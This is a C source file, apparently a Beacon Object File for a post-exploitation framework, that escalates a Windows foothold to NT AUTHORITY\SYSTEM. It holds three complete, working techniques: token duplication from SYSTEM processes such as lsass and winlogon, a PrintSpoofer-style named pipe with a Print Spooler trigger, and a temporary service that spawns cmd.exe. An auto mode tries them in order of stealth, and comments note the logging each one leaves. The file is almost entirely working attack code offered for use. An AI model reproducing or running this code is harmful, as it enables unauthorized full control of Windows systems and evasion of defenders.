/*
 * getsystem.c — Elevate to NT AUTHORITY\SYSTEM
 *
 * Three techniques, ordered by OPSEC preference:
 *
 * Technique 1 (quietest): Token duplication from SYSTEM process
 *   Requires: local admin (HIGH integrity)
 *
 * Technique 2: Named pipe + Spooler trigger (PrintSpoofer-style)
 *   Requires: SeImpersonatePrivilege + Print Spooler running
 *
 * Technique 3 (noisiest): Named pipe + temporary service
 *   WARNING: spawns cmd.exe, creates SCM event 7045
 *   Requires: local admin + SCM access
 *
 * All blocking pipe operations use a background thread + WaitForSingleObject
 * with a timeout to prevent the BOF from hanging indefinitely.
 */
#include <windows.h>
#include "beacon_compat.h"

/* ── kernel32 ── */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeW(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DisconnectNamedPipe(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ImpersonateNamedPipeClient(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(PVOID, BOOL, BOOL, LPCWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$PeekNamedPipe(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateThread(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CancelIoEx(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);

/* ── advapi32 ── */
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(SC_HANDLE, LPCWSTR, LPCWSTR,
    DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
    LPCSTR, DWORD, PVOID*, PULONG);

/* ── ntdll ── */
DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── msvcrt ── */
DECLSPEC_IMPORT int      __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT int      __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int      __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

/* ── winspool (technique 2) ── */
DECLSPEC_IMPORT BOOL WINAPI WINSPOOL$OpenPrinterW(LPWSTR, HANDLE*, PVOID);
DECLSPEC_IMPORT BOOL WINAPI WINSPOOL$ClosePrinter(HANDLE);

/* ── Constants ── */
#define PIPE_ACCESS_DUPLEX          0x00000003
#define PIPE_TYPE_BYTE              0x00000000
#define PIPE_WAIT                   0x00000000
#define SC_MANAGER_ALL_ACCESS       0x000F003F
#define SERVICE_ALL_ACCESS          0x000F01FF
#define SERVICE_WIN32_OWN_PROCESS   0x00000010
#define SERVICE_DEMAND_START        0x00000003
#define SERVICE_ERROR_IGNORE        0x00000000
#define PROCESS_QUERY_INFORMATION   0x0400
#define TOKEN_ALL_ACCESS            0x000F01FF
#define TOKEN_QUERY                 0x0008
#define TOKEN_DUPLICATE             0x0002
#define TOKEN_IMPERSONATE           0x0004
#define MY_SecurityImpersonation    2
#define MY_SecurityDelegation       3
#define MY_TokenImpersonation       2
#define MY_TokenUser                1
#define MY_TokenIntegrityLevel      25
#define SystemProcessInformation    5
#define MEM_COMMIT                  0x1000
#define MEM_RESERVE                 0x2000
#define MEM_RELEASE                 0x8000
#define PAGE_READWRITE              0x04
#define MY_INVALID_HANDLE           ((HANDLE)(LONG_PTR)-1)
#define SDDL_REVISION_1             1
#define PIPE_CONNECT_TIMEOUT_MS     8000

/* ════════════════════════════════════════════════════
 * Helpers
 * ════════════════════════════════════════════════════ */

static void get_token_user(HANDLE hToken, char *out, int outLen) {
    BYTE buf[256];
    DWORD needed = 0;
    out[0] = 0;
    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
        return;
    PSID pSid = *(PSID*)buf;
    wchar_t name[128] = {0}, domain[128] = {0};
    DWORD nameLen = 128, domLen = 128, sidUse = 0;
    if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nameLen, domain, &domLen, &sidUse)) {
        char aName[128], aDomain[128];
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
        int pos = 0;
        for (int i = 0; aDomain[i] && pos < outLen - 2; i++) out[pos++] = aDomain[i];
        out[pos++] = '\\';
        for (int i = 0; aName[i] && pos < outLen - 1; i++) out[pos++] = aName[i];
        out[pos] = 0;
    }
}

static const char* get_integrity(HANDLE hToken) {
    BYTE buf[64];
    DWORD needed = 0;
    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenIntegrityLevel, buf, sizeof(buf), &needed))
        return "???";
    PSID pSid = *(PSID*)buf;
    BYTE subAuthCount = ((BYTE*)pSid)[1];
    DWORD *pRid = (DWORD*)((BYTE*)pSid + 8 + (subAuthCount - 1) * 4);
    DWORD rid = *pRid;
    if (rid >= 0x4000) return "SYSTEM";
    if (rid >= 0x3000) return "HIGH";
    if (rid >= 0x2000) return "MEDIUM";
    return "LOW";
}

/*
 * Verify impersonation by reading the current THREAD token.
 */
static BOOL verify_system(void) {
    HANDLE hThreadToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
            TOKEN_QUERY, FALSE, &hThreadToken)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] No thread token — impersonation not active (err: %u)\n",
            KERNEL32$GetLastError());
        return FALSE;
    }

    char user[256] = {0};
    get_token_user(hThreadToken, user, sizeof(user));
    const char *integrity = get_integrity(hThreadToken);
    KERNEL32$CloseHandle(hThreadToken);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Thread token: %s (Integrity: %s)\n", user, integrity);

    /* Check if it's actually SYSTEM */
    for (int i = 0; user[i]; i++) {
        if (user[i] == 'S' && user[i+1] == 'Y' && user[i+2] == 'S' &&
            user[i+3] == 'T' && user[i+4] == 'E' && user[i+5] == 'M')
            return TRUE;
    }

    BeaconPrintf(CALLBACK_ERROR, "[!] Token is NOT SYSTEM\n");
    return FALSE;
}

/*
 * Background thread that calls ConnectNamedPipe (blocking).
 * The main thread uses WaitForSingleObject on the thread handle
 * with a timeout, then kills the thread if it didn't complete.
 */
static DWORD WINAPI connect_pipe_thread(LPVOID param) {
    HANDLE hPipe = (HANDLE)param;
    BOOL ok = KERNEL32$ConnectNamedPipe(hPipe, NULL);
    if (!ok && KERNEL32$GetLastError() == 535) /* ERROR_PIPE_CONNECTED */
        ok = TRUE;
    return ok ? 0 : 1;
}

/*
 * Wait for a pipe connection with a timeout.
 * Spawns ConnectNamedPipe on a background thread.
 * Returns TRUE if a client connected within timeoutMs.
 */
static BOOL wait_for_pipe_connection(HANDLE hPipe, DWORD timeoutMs) {
    DWORD threadId = 0;
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0,
        (LPVOID)connect_pipe_thread, (LPVOID)hPipe, 0, &threadId);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateThread failed: %u\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    DWORD waitResult = KERNEL32$WaitForSingleObject(hThread, timeoutMs);

    if (waitResult == 0) {
        /* Thread completed — check its exit code */
        /* Exit code 0 = connected, 1 = failed */
        KERNEL32$CloseHandle(hThread);
        return TRUE; /* assume connected if thread completed */
    }

    /* Timeout or error — kill the blocking thread */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Pipe connect timed out after %ums\n", timeoutMs);

    /* Cancel the blocking ConnectNamedPipe and kill the thread */
    KERNEL32$CancelIoEx(hPipe, NULL);
    KERNEL32$WaitForSingleObject(hThread, 1000); /* give it 1s to exit after cancel */
    KERNEL32$TerminateThread(hThread, 1);
    KERNEL32$CloseHandle(hThread);
    return FALSE;
}

/*
 * Safely drain data from a pipe using PeekNamedPipe first.
 * Never blocks — returns immediately if no data available.
 */
static void drain_pipe(HANDLE hPipe) {
    DWORD avail = 0;
    if (KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) && avail > 0) {
        char buf[64];
        DWORD bytesRead = 0;
        DWORD toRead = avail < sizeof(buf) ? avail : sizeof(buf);
        KERNEL32$ReadFile(hPipe, buf, toRead, &bytesRead, NULL);
    }
}

/* ════════════════════════════════════════════════════
 * TECHNIQUE 1: Token duplication from SYSTEM process
 *
 * No pipe, no service, no child process.
 * ════════════════════════════════════════════════════ */
static BOOL technique_token_dup(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique 1: Token duplication from SYSTEM process\n");

    const wchar_t *targets[] = {
        L"winlogon.exe",
        L"services.exe",
        L"spoolsv.exe",
        L"svchost.exe",
        L"lsass.exe",
        NULL
    };

    ULONG bufSize = 1024 * 1024;
    PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return FALSE;
    }

    ULONG retLen = 0;
    DWORD status;
    while ((status = NTDLL$NtQuerySystemInformation(
            SystemProcessInformation, buffer, bufSize, &retLen)) == 0xC0000004) {
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = retLen + 4096;
        buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return FALSE;
    }

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtQuerySystemInformation: 0x%08x\n", status);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return FALSE;
    }

    BOOL success = FALSE;

    for (int t = 0; targets[t] && !success; t++) {
        BYTE *current = (BYTE*)buffer;

        while (1) {
            DWORD nextOffset = *(DWORD*)(current + 0x00);
            DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x48));
            USHORT nameLen   = *(USHORT*)(current + 0x38);
            wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));

            if (pid > 4 && nameLen > 0 && nameBuf) {
                wchar_t procName[128];
                MSVCRT$memset(procName, 0, sizeof(procName));
                int copyLen = nameLen / 2;
                if (copyLen > 127) copyLen = 127;
                for (int i = 0; i < copyLen; i++)
                    procName[i] = nameBuf[i];

                if (MSVCRT$_wcsicmp(procName, targets[t]) == 0) {
                    HANDLE hProc = KERNEL32$OpenProcess(
                        PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (!hProc) goto next_entry;

                    HANDLE hToken = NULL;
                    if (!ADVAPI32$OpenProcessToken(hProc,
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                            &hToken)) {
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Verify this is actually a SYSTEM token */
                    char tokenUser[256] = {0};
                    get_token_user(hToken, tokenUser, sizeof(tokenUser));
                    BOOL isSystem = FALSE;
                    for (int i = 0; tokenUser[i]; i++) {
                        if (tokenUser[i] == 'S' && tokenUser[i+1] == 'Y' &&
                            tokenUser[i+2] == 'S' && tokenUser[i+3] == 'T' &&
                            tokenUser[i+4] == 'E' && tokenUser[i+5] == 'M') {
                            isSystem = TRUE;
                            break;
                        }
                    }

                    if (!isSystem) {
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    HANDLE hDup = NULL;
                    if (ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,
                            NULL, MY_SecurityDelegation, MY_TokenImpersonation,
                            &hDup)) {
                        if (ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
                            char aProc[128] = {0};
                            KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                                procName, -1, aProc, 128, NULL, NULL);
                            BeaconPrintf(CALLBACK_OUTPUT,
                                "[+] SYSTEM token duplicated from %s (PID %u)\n",
                                aProc, pid);
                            success = TRUE;
                        } else {
                            BeaconPrintf(CALLBACK_ERROR,
                                "[!] ImpersonateLoggedOnUser failed: %u\n",
                                KERNEL32$GetLastError());
                            KERNEL32$CloseHandle(hDup);
                        }
                    } else {
                        BeaconPrintf(CALLBACK_ERROR,
                            "[!] DuplicateTokenEx failed: %u\n",
                            KERNEL32$GetLastError());
                    }

                    KERNEL32$CloseHandle(hToken);
                    KERNEL32$CloseHandle(hProc);
                    if (success) break;
                }
            }
next_entry:
            if (nextOffset == 0) break;
            current += nextOffset;
        }
    }

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);

    if (!success)
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Could not duplicate any SYSTEM token\n");

    return success;
}

/* ════════════════════════════════════════════════════
 * TECHNIQUE 2: PrintSpoofer — named pipe + Spooler trigger
 *
 * No child process. Needs SeImpersonatePrivilege + Spooler.
 * ════════════════════════════════════════════════════ */
static BOOL technique_pipe_spooler(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique 2: PrintSpoofer (pipe + Spooler)\n");

    DWORD tick = KERNEL32$GetTickCount();
    wchar_t pipeRand[32];
    MSVCRT$swprintf(pipeRand, 32, L"%08x", tick ^ 0xCAFEBABE);

    /* PrintSpoofer pipe format: \\.\pipe\<rand>\pipe\spoolss */
    wchar_t pipeName[256];
    MSVCRT$swprintf(pipeName, 256, L"\\\\.\\pipe\\%s\\pipe\\spoolss", pipeRand);

    HANDLE hPipe = KERNEL32$CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        10, 4096, 4096, 5000, NULL
    );

    if (hPipe == MY_INVALID_HANDLE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipe failed: %u\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    /* Start background thread waiting for pipe connection */
    DWORD threadId = 0;
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0,
        (LPVOID)connect_pipe_thread, (LPVOID)hPipe, 0, &threadId);

    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateThread failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    /* Give pipe thread a moment to start waiting */
    KERNEL32$Sleep(100);

    /* Trigger spooler: OpenPrinter("\\localhost/pipe/<rand>")
     * Spooler resolves → \\localhost\pipe\<rand>\pipe\spoolss → our pipe */
    wchar_t printerPath[256];
    MSVCRT$swprintf(printerPath, 256, L"\\\\localhost/pipe/%s", pipeRand);

    HANDLE hPrinter = NULL;
    WINSPOOL$OpenPrinterW(printerPath, &hPrinter, NULL);
    if (hPrinter) WINSPOOL$ClosePrinter(hPrinter);

    /* Wait for connection with timeout */
    DWORD waitResult = KERNEL32$WaitForSingleObject(hThread, PIPE_CONNECT_TIMEOUT_MS);

    if (waitResult != 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Spooler did not connect (timeout)\n"
            "    Is the Print Spooler service running?\n");
        KERNEL32$CancelIoEx(hPipe, NULL);
        KERNEL32$WaitForSingleObject(hThread, 1000);
        KERNEL32$TerminateThread(hThread, 1);
        KERNEL32$CloseHandle(hThread);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }
    KERNEL32$CloseHandle(hThread);

    /* Drain any data without blocking */
    drain_pipe(hPipe);

    /* Impersonate */
    if (!KERNEL32$ImpersonateNamedPipeClient(hPipe)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$DisconnectNamedPipe(hPipe);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ImpersonateNamedPipeClient succeeded\n");
    KERNEL32$DisconnectNamedPipe(hPipe);
    KERNEL32$CloseHandle(hPipe);
    return TRUE;
}

/* ════════════════════════════════════════════════════
 * TECHNIQUE 3: Named pipe + temporary service (NOISY)
 *
 * Spawns cmd.exe as SYSTEM. Creates Event 7045.
 * ════════════════════════════════════════════════════ */
static BOOL technique_service_pipe(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Technique 3: Named pipe + service (spawns cmd.exe)\n");

    DWORD tick = KERNEL32$GetTickCount();
    wchar_t pipeName[128];
    MSVCRT$swprintf(pipeName, 128, L"\\\\.\\pipe\\netlogon_%08x", tick ^ 0xDEADBEEF);

    HANDLE hPipe = KERNEL32$CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, 4096, 4096, 5000, NULL
    );

    if (hPipe == MY_INVALID_HANDLE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipe failed: %u\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    wchar_t binPath[512];
    MSVCRT$swprintf(binPath, 512, L"cmd.exe /c echo svc > %s", pipeName);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManager failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    wchar_t svcName[64];
    MSVCRT$swprintf(svcName, 64, L"svc_%08x", tick);

    SC_HANDLE hService = ADVAPI32$CreateServiceW(
        hSCM, svcName, NULL,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateService failed: %u\n",
                     KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    /* Start the service — cmd.exe connects to pipe as SYSTEM */
    ADVAPI32$StartServiceW(hService, 0, NULL);

    /* Wait for pipe connection WITH TIMEOUT (was blocking forever before) */
    BOOL connected = wait_for_pipe_connection(hPipe, PIPE_CONNECT_TIMEOUT_MS);

    /* Delete service immediately regardless of outcome */
    ADVAPI32$DeleteService(hService);
    ADVAPI32$CloseServiceHandle(hService);
    ADVAPI32$CloseServiceHandle(hSCM);

    if (!connected) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Service did not connect to pipe\n");
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    /* Drain pipe data without blocking */
    drain_pipe(hPipe);

    /* Impersonate */
    if (!KERNEL32$ImpersonateNamedPipeClient(hPipe)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$DisconnectNamedPipe(hPipe);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ImpersonateNamedPipeClient succeeded\n");
    KERNEL32$DisconnectNamedPipe(hPipe);
    KERNEL32$CloseHandle(hPipe);
    return TRUE;
}

/* ════════════════════════════════════════════════════
 * ENTRY POINT
 * ════════════════════════════════════════════════════ */
void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int technique = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] GetSystem — elevating to NT AUTHORITY\\SYSTEM\n\n");

    BOOL success = FALSE;

    switch (technique) {
        case 1:
            success = technique_token_dup();
            break;
        case 2:
            success = technique_pipe_spooler();
            break;
        case 3:
            success = technique_service_pipe();
            break;
        default:
            /* Auto: try in OPSEC order, each with timeout protection */
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Auto mode — trying techniques 1 → 2 → 3\n\n");

            success = technique_token_dup();

            if (!success) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "\n[*] Technique 1 failed, trying PrintSpoofer...\n\n");
                success = technique_pipe_spooler();
            }

            if (!success) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "\n[*] Technique 2 failed, trying service pipe...\n\n");
                success = technique_service_pipe();
            }
            break;
    }

    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        if (verify_system()) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "\n[+] SUCCESS — elevated to NT AUTHORITY\\SYSTEM\n"
                "[*] Use 'tokenmanip --action revert' to drop impersonation\n");
        } else {
            /* Impersonation call succeeded but token isn't SYSTEM */
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Impersonation set but token is not SYSTEM\n"
                "[*] SeImpersonatePrivilege may not be held\n");
            ADVAPI32$RevertToSelf();
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "\n[!] All techniques failed\n"
            "[*] Requirements:\n"
            "    1 (token dup):  local admin (HIGH integrity)\n"
            "    2 (spooler):    SeImpersonatePrivilege + Spooler running\n"
            "    3 (service):    local admin + SCM access\n");
    }
}
